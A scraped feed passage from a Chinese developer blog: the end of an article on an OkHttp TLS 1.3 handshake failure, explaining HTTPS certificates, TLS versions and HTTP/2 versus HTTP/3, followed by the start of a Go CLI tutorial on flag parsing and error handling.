        at okhttp3.internal.connection.StreamAllocation.findHealthyConnection(StreamAllocation.java:<span class="hljs-number">135</span>)
        at okhttp3.internal.connection.StreamAllocation.newStream(StreamAllocation.java:<span class="hljs-number">114</span>)
        at okhttp3.internal.connection.ConnectInterceptor.intercept(ConnectInterceptor.java:<span class="hljs-number">42</span>)
        at okhttp3.internal.http.RealInterceptorChain.proceed(RealInterceptorChain.java:<span class="hljs-number">147</span>)
        at okhttp3.internal.http.RealInterceptorChain.proceed(RealInterceptorChain.java:<span class="hljs-number">121</span>)
        at okhttp3.internal.cache.CacheInterceptor.intercept(CacheInterceptor.java:<span class="hljs-number">94</span>)
        at okhttp3.internal.http.RealInterceptorChain.proceed(RealInterceptorChain.java:<span class="hljs-number">147</span>)
        at okhttp3.internal.http.RealInterceptorChain.proceed(RealInterceptorChain.java:<span class="hljs-number">121</span>)
        at okhttp3.internal.http.BridgeInterceptor.intercept(BridgeInterceptor.java:<span class="hljs-number">93</span>)
        at okhttp3.internal.http.RealInterceptorChain.proceed(RealInterceptorChain.java:<span class="hljs-number">147</span>)
        at okhttp3.internal.http.RetryAndFollowUpInterceptor.intercept(RetryAndFollowUpInterceptor.java:<span class="hljs-number">125</span>)
        at okhttp3.internal.http.RealInterceptorChain.proceed(RealInterceptorChain.java:<span class="hljs-number">147</span>)
        at okhttp3.internal.http.RealInterceptorChain.proceed(RealInterceptorChain.java:<span class="hljs-number">121</span>)
        at okhttp3.RealCall.getResponseWithInterceptorChain(RealCall.java:<span class="hljs-number">264</span>)
        at okhttp3.RealCall.execute(RealCall.java:<span class="hljs-number">93</span>)
...
</code></pre>
<p>异常根源清晰指向 “协议版本不兼容”：服务端仅开启 TLS 1.3，而我方 OkHttp 客户端默认使用 TLS 1.2 发起请求，最终导致全量请求失败。</p>
<p>故障虽已解决，但背后的技术原理值得深究。不妨先自测以下核心问题的掌握程度：</p>
<blockquote>
<ol>
<li>HTTPS 与 HTTP 的核心区别？HTTP2.0、HTTP3.0 的差异？QUIC 协议是什么？</li>
<li>HTTPS 证书的核心作用？浏览器如何检测证书过期？</li>
<li>TLS 协议的定义？与 SSL 协议的关系？</li>
<li>如何查看网站的安全等级和证书信息？</li>
<li>OkHttp 客户端默认 SSL 配置？不同 JDK 版本下 OkHttp 的 SSL 配置是否有差异？</li>
</ol>
</blockquote>
<p>接下来，我们逐一拆解这些关键问题。</p>
<h3 data-id="heading-3">为什么 HTTPS 必须要有证书？</h3>
<p>提到 HTTPS 与 HTTP 的区别，多数人能说出 “端口不同（80 vs 443）”“HTTPS 加密传输”，但很少有人深究：为何单纯的加密不足以保障安全，必须依赖证书？</p>
<p>如果仅靠 “请求 / 响应加密” 就能解决问题，那么在 HTTP 层面手动加密数据也能实现。但互联网的核心风险并非 “数据窃听”，而是 “身份篡改”—— 没有证书，你无法确认访问的网站是否为钓鱼网站；更关键的是，客户端与服务端无法完成安全的密钥协商，最终加密连接也无法建立。</p>
<p>简单来说，HTTPS 证书的核心价值有两点：</p>
<ul>
<li>身份验证：证明网站的合法身份，防止钓鱼攻击；</li>
<li>密钥协商：为客户端与服务端建立加密连接提供安全的密钥交换机制。</li>
</ul>
<h3 data-id="heading-4">HTTPS 证书的获取与使用</h3>
<h4 data-id="heading-5">证书的类型</h4>
<p>目前主流云厂商（阿里云、腾讯云等）均可申请 HTTPS 证书，按验证等级可分为三类：</p>
<ul>
<li>DV（域名验证型）：免费且常用，仅验证域名归属，适合个人 / 小型网站；</li>
<li>OV（组织验证型）：需验证企业真实身份，适合中小企业；</li>
<li>EV（扩展验证型）：验证最严格，浏览器地址栏会显示企业名称，适合银行、支付平台等敏感场景。</li>
</ul>
<h4 data-id="heading-6">证书的有效期</h4>
<ul>
<li>免费证书（如 DV 型）：有效期通常 90 天，支持自动续签；</li>
<li>付费证书（OV/EV 型）：有效期 1-2 年，需手动续签 / 重新申请。</li>
</ul>
<h4 data-id="heading-7">证书过期的影响</h4>
<p>有人会问：证书过期后网站仍能访问，仅浏览器提示 “不安全”，为何必须续期？核心原因有三：</p>
<ol>
<li>密钥协商失败：浏览器 / 客户端与服务器无法协商出安全的加密密钥，传输会退化为明文，数据直接 “裸奔”；</li>
<li>用户信任丧失：浏览器的 “不安全” 提示会导致用户放弃访问；</li>
<li>客户端请求报错：通过 OkHttp 等工具访问过期证书的网站时，会直接抛出<code>SSLHandshakeException</code>异常（这也是英雄联盟证书过期导致玩家无法登录的核心原因）。</li>
</ol>
<p>证书申请后，需将<code>.pem</code>、<code>.key</code>等格式的证书文件配置到 Nginx、Apache、Tomcat 等 Web 服务器，并开启 TLS 协议支持，才能真正生效。</p>
<h3 data-id="heading-8">浏览器如何验证证书合法性？</h3>
<p>浏览器并不会内置所有网站的证书，而是通过 “信任链” 机制验证，流程类似 “身份证核验”：</p>
<blockquote>
<ol>
<li>网站向浏览器发送自身证书；</li>
<li>验证签发机构：检查证书的签发 CA（证书颁发机构）是否在浏览器的信任名单中，排除 “假证书”；</li>
<li>验证证书有效性：确认证书绑定的域名与访问域名一致（防钓鱼）、证书在有效期内（未过期 / 未吊销）；</li>
<li>验证签名完整性：CA 用私钥给证书 “签名”，浏览器用内置的 CA 根证书（公钥）验证签名，确保证书未被篡改。</li>
</ol>
</blockquote>
<p><strong>实操技巧</strong>：点击浏览器地址栏的🔒图标，即可查看当前网站的证书信息（如有效期、签发机构、加密协议等），如下图所示</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c0982f3328784e2a834e007077d33469~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Ieq54S25ZC45rCU5Y-R5Yqo5py6:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768293765&amp;x-signature=S8yxqhk%2Fy8Nj2IfhG6UeFW5DwRI%3D" alt="image.png" loading="lazy"/></p>
<h3 data-id="heading-9">Http2.0  Http3.0 与 QUIC 协议</h3>
<p>HTTP2.0 和 HTTP3.0 的诞生，均是为了解决 HTTP/1.1 的性能瓶颈，但二者的底层传输协议截然不同 ——HTTP2.0 基于 TCP，HTTP3.0 基于 QUIC。</p>
<p>先明确协议层级：HTTP 属于 OSI 应用层协议，TCP/UDP 属于传输层协议；而 QUIC 协议的层级尚无统一定论，笔者更倾向于归为应用层（因其底层依赖 UDP，且封装了 TCP 的可靠性 + TLS 的加密能力）。</p>
<h4 data-id="heading-10">HTTP3.0 使用 QUIC 协议的核心优势</h4>
<ol>
<li>握手效率提升：合并 TCP 三次握手与 TLS 握手流程，大幅缩短连接建立时间；</li>
<li>解决队头阻塞：将数据分割为多个独立流，每个流独立传输，彻底解决 TCP 的队头阻塞问题。</li>
</ol>
<p>这里补充说明下什么叫做 “TCP队头阻塞问题”</p>
<blockquote>
<p>TCP 是 “面向连接的可靠传输协议”，核心特性是 “按序交付”—— 数据被分割为多个数据包后，服务端必须按发送顺序接收重组。若某个数据包丢失 / 延迟，后续已到达的数据包会被缓存，等待丢失数据包重传完成后再处理，这就是 “队头阻塞”。
在 HTTP2.0 的多路复用场景中，多个请求复用同一个 TCP 连接，只要其中一个帧对应的数据包丢失，整个连接上的所有请求都会被阻塞，直接削弱多路复用的性能优势。</p>
</blockquote>
<h4 data-id="heading-11">为何 HTTP3.0 尚未全面普及？</h4>
<p>尽管 HTTP3.0 性能更优，但国内多数网站仍使用 HTTP2.0（如稀土掘金），核心原因之一是 TLS 协议的兼容性：</p>
<ul>
<li>HTTP3.0 基于 QUIC 协议，而 QUIC 原生要求 TLS 1.3；</li>
<li>部分老旧客户端（如低版本 JDK+OkHttp）不支持 TLS 1.3，强制升级会导致请求失败。</li>
</ul>
<p><strong>实操技巧</strong>：在 Chrome 控制台执行<code>window.chrome.loadTimes()</code>，查看<code>npnNegotiatedProtocol</code>属性就知道当前网站在使用的是HTTP3还是HTTP2：</p>
<ul>
<li><code>h2</code>：使用 HTTP2.0；</li>
<li><code>h3</code>：使用 HTTP3.0。</li>
</ul>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f7c29e3f7b0143a991423c9e92e649e5~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Ieq54S25ZC45rCU5Y-R5Yqo5py6:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768293765&amp;x-signature=TMPBvmSw2IPJZBwBPEMqrPDTssA%3D" alt="image copy.png" loading="lazy"/></p>
<h3 data-id="heading-12">TLS是什么 和 SSL 协议是什么关系</h3>
<p>早期教程常将 HTTPS 简化为 “HTTP+SSL”，但这一表述现已过时：</p>
<ul>
<li>SSL：由网景公司 1994 年推出，历经 SSL 1.0/2.0/3.0 版本，因存在致命漏洞（如 POODLE 漏洞），2015 年起被主流浏览器 / 服务器全面禁用；</li>
<li>TLS：作为 SSL 的替代协议，继承了 SSL 的核心目标，且持续迭代优化（主流版本为 TLS 1.2、TLS 1.3）。</li>
</ul>
<p>尽管历史原因导致 “SSL 证书” 的说法仍被沿用，但如今 HTTPS 的核心加密协议已是 TLS。</p>
<h4 data-id="heading-13">TLS 的核心价值</h4>
<p>与 SSL 一致，TLS 主要解决三大问题：</p>
<ul>
<li>数据加密：避免传输过程中被窃听；</li>
<li>身份验证：配合证书确认通信双方身份；</li>
<li>数据完整性：防止数据被篡改。</li>
</ul>
<p>在Https现在主流使用的是 TLS 1.3 和 TLS 1.2 两种加密协议，但是由于历史原因很多人仍会说 “SSL 证书”，但是实际上SSL已经不再是HTTPS的主流加密协议了</p>
<p>TLS的核心价值和SSL需要解决的问题是一致的，主要有三点： 数据加密（避免传输过程中被窃听）、 身份验证（配合证书确认通信双方身份）、数据完整性（防止数据被篡改）</p>
<h4 data-id="heading-14">TLS 1.2 vs TLS 1.3</h4>
<p>TLS 1.3 相比 1.2 做了关键优化：</p>
<ul>
<li>简化握手流程：将 “两次往返” 缩短为 “一次往返”，提升 HTTPS 连接建立速度；</li>
<li>移除不安全加密套件：进一步提升安全性。</li>
</ul>
<p>除此之外TLS和Http的版本也有常用的搭配关系：</p>

























<table><thead><tr><th>HTTP版本</th><th>常见搭配TLS版本</th><th>备注</th></tr></thead><tbody><tr><td>HTTP/1.1</td><td>TLS 1.2、TLS 1.3</td><td>传统HTTPS常用组合，可灵活切换</td></tr><tr><td>HTTP/2</td><td>TLS 1.2（主流）、TLS 1.3</td><td>无强制绑定，支持更高版本TLS</td></tr><tr><td>HTTP/3</td><td>仅TLS 1.3</td><td>HTTP/3基于QUIC协议，QUIC原生内置TLS 1.3加密</td></tr></tbody></table>
<p>这也解释了为何 HTTP3.0 难以快速普及：TLS 1.3 对客户端版本（如 JDK、OkHttp）有严格要求，老旧客户端无法兼容。</p>
<h3 data-id="heading-15">使用OkHttp进行Https协议通信的一些细节问题</h3>
<p>很多人创建OkHttp客户端在代码里面可能就像这样，简单的只有一行代码：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-type">OkHttpClient</span> <span class="hljs-variable">CLIENT</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">OkHttpClient</span>.Builder()
        .readTimeout(<span class="hljs-number">16</span>, TimeUnit.SECONDS)
        .build();
</code></pre>
<p>看似简洁的代码背后，OkHttp 默认做了大量 SSL 配置：</p>
<ol>
<li>复用 JVM 默认 SSLContext：JVM 启动时加载系统默认 SSLContext，支持的 TLS 版本取决于 Java 版本；</li>
<li>加载系统信任证书库：使用操作系统 / JVM 内置的 CA 根证书，可验证绝大多数正规网站证书；</li>
<li>启用 MODERN_TLS 规范：默认启用 TLS 1.2、TLS 1.3，禁用不安全的 SSL/TLS 版本。</li>
</ol>
<h4 data-id="heading-16">核心坑点：JDK 版本影响 TLS 支持</h4>
<p>OkHttp 的默认 SSL 配置依赖 JVM 的 SSLContext，而不同 JDK 版本对 TLS 1.3 的支持不同：</p>
<ul>
<li>Java 8 u261 之前：默认不支持 TLS 1.3；</li>
<li>Java 8 u261+：需手动开启 TLS 1.3；</li>
<li>Java 11+：默认支持 TLS 1.3。</li>
</ul>
<p>这也是前文故障 2 的核心原因：服务端仅开启 TLS 1.3，而我方使用的低版本 JDK+OkHttp 默认仅支持 TLS 1.2，最终导致协议版本不兼容报错。</p>
<h2 data-id="heading-17">总结</h2>
<p>HTTPS 看似是 “加了层加密” 的 HTTP，实则是涉及证书、TLS/SSL、传输协议的复杂体系，任何一个环节的配置疏漏都可能引发生产级故障。结合本文的两起故障与技术拆解，可总结出以下核心结论：</p>
<ol>
<li><strong>证书是 HTTPS 的核心基石</strong>：不仅是 “加密” 的前提，更是身份验证的关键，证书过期 / 配置错误会直接导致客户端请求失败（而非仅浏览器提示不安全）；</li>
<li><strong>TLS 协议是 HTTPS 的加密核心</strong>：SSL 已被淘汰，TLS 1.2/1.3 是当前主流，且 TLS 版本直接影响 HTTP 协议的选择（如 HTTP3.0 强制要求 TLS 1.3）；</li>
<li><strong>客户端配置需适配服务端</strong>：OkHttp 等客户端的 SSL 配置依赖 JDK 版本，低版本 JDK 可能不支持高版本 TLS，需提前做好兼容性验证；</li>
<li><strong>HTTP3.0 普及仍需时间</strong>：尽管性能优势显著，但因 TLS 1.3 的兼容性要求，当前多数网站仍以 HTTP2.0+TLS 1.2 为主；</li>
<li><strong>基础配置不可忽视</strong>：无论是证书续期、TLS 协议配置，还是客户端 SSL 适配，这些看似 “基础” 的操作，却是保障 HTTPS 通信稳定的关键，一旦疏忽就可能酿成 P0 故障。</li>
</ol>
<p>作为技术人，我们不仅要解决故障，更要理解故障背后的技术原理 —— 只有吃透 HTTPS 的核心逻辑，才能从根源上避免类似问题的发生。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Go CLI 入口设计：参数解析、错误处理与项目分层实战]]></title>    <link>https://juejin.cn/post/7591702898080563215</link>    <guid>https://juejin.cn/post/7591702898080563215</guid>    <pubDate>2026-01-05T15:03:39.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7591702898080563215" data-draft-id="7591704324906942498" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Go CLI 入口设计：参数解析、错误处理与项目分层实战"/> <meta itemprop="keywords" content="后端,Go"/> <meta itemprop="datePublished" content="2026-01-05T15:03:39.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Java小成"/> <meta itemprop="url" content="https://juejin.cn/user/3614849960783160"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Go CLI 入口设计：参数解析、错误处理与项目分层实战
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3614849960783160/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Java小成
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-05T15:03:39.000Z" title="Mon Jan 05 2026 15:03:39 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-05
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读7分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">Go语言学习系列文章</h2>
<ul>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%2FhZIvsqGTTLdp7vn4bXrueA" target="_blank" title="https://mp.weixin.qq.com/s/hZIvsqGTTLdp7vn4bXrueA" ref="nofollow noopener noreferrer">01 Go 项目结构总是写乱？这个 50 行代码的 Demo 教你标准姿势</a></li>
</ul>
<h2 data-id="heading-1">1. 场景复现：那个让我头疼的时刻</h2>
<p>周一早上，我接手了一个线上的配置同步小工具。它的职责很简单：每天凌晨跑一次，从配置中心拉数据，然后推送到各个节点。</p>
<p>工具跑了大半年都没出过问题，直到那天——凌晨 3 点告警响了，日志里只有一行：</p>
<pre><code class="hljs">程序启动失败
</code></pre>
<p>我盯着这行字看了五分钟，脑子里全是问号：<strong>哪里失败了？参数没传？配置文件没找到？网络不通？</strong></p>
<p>排查了一个多小时，最后发现是运维同学改了启动脚本，漏掉了一个必填参数。但程序压根没告诉我是哪个参数出了问题。</p>
<p>那一刻我意识到：<strong>一个靠谱的程序，必须从入口就"把话说清楚"</strong>。参数怎么解析、默认值是什么、出错时怎么反馈——这些看似基础的东西，决定了凌晨 3 点你能不能多睡一会儿。</p>
<p>今天这个项目，就是我总结出来的 <strong>Go CLI 入口模板</strong>。它很小，但五脏俱全。</p>
<h2 data-id="heading-2">2. 架构蓝图：上帝视角看设计</h2>
<p>先来看整体结构。这个项目只有三个核心文件，但它展示了 Go 项目的<strong>标准分层方式</strong>：</p>
<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b574048d49be41b4b2f82bc515d3a547~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSmF2YeWwj-aIkA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768230219&amp;x-signature=HrQex2fny45g5%2FxmnZ2R6gWS18Q%3D" alt="image-20260105225642842" loading="lazy"/>
<p><strong>核心设计思想</strong>：</p>
<ul>
<li><strong>main.go 只做调度</strong>：它不包含任何业务逻辑，只负责"接参数 → 调函数 → 输出结果"</li>
<li><strong>internal 目录放内部包</strong>：Go 有个约定，<code>internal</code> 目录下的代码只能被同一个模块引用，外部项目无法 import。这是一种"访问控制"</li>
<li><strong>一个目录一个包</strong>：<code>cliinfo</code> 负责参数解析，<code>reasons</code> 负责业务逻辑，职责清晰</li>
</ul>
<p>这种分层的好处是什么？<strong>每个包都可以独立写单元测试</strong>。你不需要启动整个程序，就能验证参数解析逻辑对不对。</p>
<h2 data-id="heading-3">3. 源码拆解：手把手带你读核心</h2>
<h3 data-id="heading-4">3.1 入口文件：main.go</h3>
<pre><code class="hljs language-go" lang="go"><span class="hljs-keyword">package</span> main

<span class="hljs-keyword">import</span> (
	<span class="hljs-string">"fmt"</span>
	<span class="hljs-string">"os"</span>
	<span class="hljs-string">"runtime"</span>
	<span class="hljs-string">"strings"</span>
	<span class="hljs-string">"time"</span>

	<span class="hljs-string">"learn-go/series/02/internal/cliinfo"</span>
	<span class="hljs-string">"learn-go/series/02/internal/reasons"</span>
)

<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> {
	cfg, err := cliinfo.Parse(os.Args[<span class="hljs-number">1</span>:])
	<span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> {
		fmt.Fprintln(os.Stderr, <span class="hljs-string">"参数错误:"</span>, err)
		os.Exit(<span class="hljs-number">1</span>)
	}

	lines := []<span class="hljs-type">string</span>{
		fmt.Sprintf(<span class="hljs-string">"你好，%s！"</span>, cfg.Name),
		fmt.Sprintf(<span class="hljs-string">"你正在体验：%s"</span>, strings.ToUpper(cfg.Lang)),
		fmt.Sprintf(<span class="hljs-string">"今天的结论：%s"</span>, reasons.Reason(cfg.Lang)),
		fmt.Sprintf(<span class="hljs-string">"运行环境：%s/%s"</span>, runtime.GOOS, runtime.GOARCH),
		fmt.Sprintf(<span class="hljs-string">"Go 版本：%s"</span>, runtime.Version()),
		fmt.Sprintf(<span class="hljs-string">"生成时间：%s"</span>, time.Now().Format(time.RFC3339)),
	}

	fmt.Println(strings.Join(lines, <span class="hljs-string">"\n"</span>))
}
</code></pre>
<p>这段代码只有 20 多行，但信息量很大。让我逐个拆解：</p>
<p><strong><code>os.Args[1:]</code> 是什么？</strong></p>
<p><code>os.Args</code> 是一个字符串切片，包含了命令行的所有参数。<code>Args[0]</code> 是程序本身的路径，<code>Args[1:]</code> 才是用户传入的参数。</p>
<p><strong><code>cfg, err := cliinfo.Parse(...)</code> 的多返回值</strong></p>
<p>这是 Go 最经典的模式。函数同时返回"结果"和"错误"，调用方必须处理错误。如果你写过 Java，可以把它理解为"不用 try-catch，但必须检查返回值"。</p>
<blockquote>
<p><strong>Go 知识点</strong>：Go 没有异常机制，错误通过返回值传递。<code>if err != nil</code> 是你会写一万遍的代码。</p>
</blockquote>
<p><strong><code>fmt.Fprintln(os.Stderr, ...)</code> 为什么用 Stderr？</strong></p>
<p>正常输出走 <code>stdout</code>，错误信息走 <code>stderr</code>。这是 Unix 的惯例。好处是：用户可以用管道把正常输出重定向到文件，而错误信息仍然显示在终端。</p>
<p><strong><code>os.Exit(1)</code> 的退出码</strong></p>
<p>程序正常结束返回 0，出错返回非零值。这让调用方（比如 shell 脚本）可以判断程序是否成功。</p>
<h3 data-id="heading-5">3.2 参数解析：cliinfo 包</h3>
<pre><code class="hljs language-go" lang="go"><span class="hljs-keyword">package</span> cliinfo

<span class="hljs-keyword">import</span> (
	<span class="hljs-string">"flag"</span>
	<span class="hljs-string">"fmt"</span>
	<span class="hljs-string">"strings"</span>
)

<span class="hljs-keyword">type</span> Config <span class="hljs-keyword">struct</span> {
	Name <span class="hljs-type">string</span>
	Lang <span class="hljs-type">string</span>
}

<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">Parse</span><span class="hljs-params">(args []<span class="hljs-type">string</span>)</span></span> (Config, <span class="hljs-type">error</span>) {
	fs := flag.NewFlagSet(<span class="hljs-string">"hello"</span>, flag.ContinueOnError)
	name := fs.String(<span class="hljs-string">"name"</span>, <span class="hljs-string">"工程师"</span>, <span class="hljs-string">"读者名称"</span>)
	lang := fs.String(<span class="hljs-string">"lang"</span>, <span class="hljs-string">"go"</span>, <span class="hljs-string">"关注的语言"</span>)
	fs.SetOutput(<span class="hljs-built_in">new</span>(strings.Builder))

	<span class="hljs-keyword">if</span> err := fs.Parse(args); err != <span class="hljs-literal">nil</span> {
		<span class="hljs-keyword">return</span> Config{}, err
	}

	cfg := Config{
		Name: strings.TrimSpace(*name),
		Lang: strings.ToLower(strings.TrimSpace(*lang)),
	}
	<span class="hljs-keyword">if</span> cfg.Name == <span class="hljs-string">""</span> {
		<span class="hljs-keyword">return</span> Config{}, fmt.Errorf(<span class="hljs-string">"name 不能为空"</span>)
	}
	<span class="hljs-keyword">if</span> cfg.Lang == <span class="hljs-string">""</span> {
		cfg.Lang = <span class="hljs-string">"go"</span>
	}
	<span class="hljs-keyword">return</span> cfg, <span class="hljs-literal">nil</span>
}
</code></pre>
<p><strong>为什么用 <code>flag.NewFlagSet</code> 而不是全局的 <code>flag.Parse()</code>？</strong></p>
<p>全局的 <code>flag</code> 包会直接操作 <code>os.Args</code>，而且解析失败时默认会调用 <code>os.Exit()</code>。这让代码<strong>无法测试</strong>——你没法在测试里模拟不同的参数组合。</p>
<p>用 <code>NewFlagSet</code> 创建独立的解析器，传入任意的 <code>[]string</code>，就可以在单元测试里随便折腾了。</p>
<p><strong><code>fs.String()</code> 返回的是指针</strong></p>
<pre><code class="hljs language-go" lang="go">name := fs.String(<span class="hljs-string">"name"</span>, <span class="hljs-string">"工程师"</span>, <span class="hljs-string">"读者名称"</span>)
<span class="hljs-comment">// name 的类型是 *string，不是 string</span>
</code></pre>
<p>为什么返回指针？因为 <code>Parse()</code> 调用之后，flag 包会把解析到的值写入这个指针指向的内存。如果返回值类型，就没法"回填"了。</p>
<blockquote>
<p><strong>Go 知识点</strong>：<code>*name</code> 是解引用操作，取出指针指向的值。这和 C 语言的指针概念一样。</p>
</blockquote>
<p><strong><code>flag.ContinueOnError</code> 的作用</strong></p>
<p>默认情况下，flag 解析失败会直接退出程序。设置 <code>ContinueOnError</code> 后，它会返回 error，让我们自己决定怎么处理。</p>
<p><strong><code>return Config{}, err</code> 的零值</strong></p>
<p>当出错时，我们返回一个"空的" Config。<code>Config{}</code> 是结构体的零值，所有字段都是默认值（string 的零值是空字符串）。</p>
<h3 data-id="heading-6">3.3 业务逻辑：reasons 包</h3>
<pre><code class="hljs language-go" lang="go"><span class="hljs-keyword">package</span> reasons

